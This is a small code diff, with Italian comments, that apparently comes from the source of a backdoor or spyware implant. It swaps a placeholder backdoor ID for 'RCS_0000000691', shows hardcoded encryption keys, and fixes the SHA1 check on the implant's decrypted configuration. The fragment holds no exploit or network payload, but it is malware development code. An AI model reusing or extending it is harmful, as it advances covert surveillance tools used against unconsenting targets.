@@ -115,7 +115,7 @@ BYTE bin_patched_key[KEY_LEN] = "ngkdNGKDh4H4883";
 // Qui finira' il binary patch con la chiave di cifratura per la conf
 BYTE bin_patched_key_conf[KEY_LEN] = "ngkdNGKDh4H4869";
 
-BYTE bin_patched_backdoor_id[] = "caccapupu";
+BYTE bin_patched_backdoor_id[] = "RCS_0000000691";
 
 // Variabili di configurazione globali
 nanosec_time date_delta; // Usato per eventuali aggiustamenti sulla lettura delle date
@@ -2006,7 +2006,7 @@ char *HM_ReadClearConf(char *conf_name)
 	// Check del CRC
 	SHA1Context sha;
 	SHA1Reset(&sha);
-	SHA1Input(&sha, (const unsigned char *)conf_memory_clear, conf_len - SHA_DIGEST_LENGTH);
+	SHA1Input(&sha, (const unsigned char *)conf_memory_clear, conf_len - SHA_DIGEST_LENGTH - pad_len);
 	if (SHA1Result(&sha)) {
 		for (int i=0; i<5; i++)
 			sha.Message_Digest[i] = ntohl(sha.Message_Digest[i]);
